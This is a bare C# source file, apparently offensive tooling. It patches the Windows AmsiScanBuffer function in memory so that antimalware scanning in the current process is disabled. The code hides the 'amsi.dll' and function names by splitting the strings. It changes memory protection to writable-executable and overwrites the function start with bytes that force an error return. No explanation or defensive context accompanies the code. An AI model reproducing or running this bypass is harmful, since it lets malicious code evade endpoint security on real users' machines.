using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class A
{
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

    public static void B(string[] args)
    {
        if (is64Bit())
            PA(x64);
        else
            PA(x86);
    }

    private static void PA(byte[] p)
    {
        try
        {
            var lib = Win32.LoadLibrary("am"+"si"+".d"+"l"+"l");
            IntPtr addr = Win32.GetProcAddress(lib, "A"+"msi"+"Sc"+"anB"+"uffer");

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)p.Length, 0x40, out oldProtect);

            WriteIt(p,addr);
            
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static void WriteIt(byte[] p, IntPtr addr) 
    {        
        IntPtr bytesWritten = IntPtr.Zero;
        
        // Get the process handle for the current process
        var handle = Process.GetCurrentProcess().Handle;
        
        // Use WPM instead of Marshal.Copy
        Win32.WriteProcessMemory(handle, addr, p, p.Length, out bytesWritten);
    }


    private static bool is64Bit()
    {
        bool is64Bit = true;

        if (IntPtr.Size == 4)
            is64Bit = false;

        return is64Bit;
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);
}
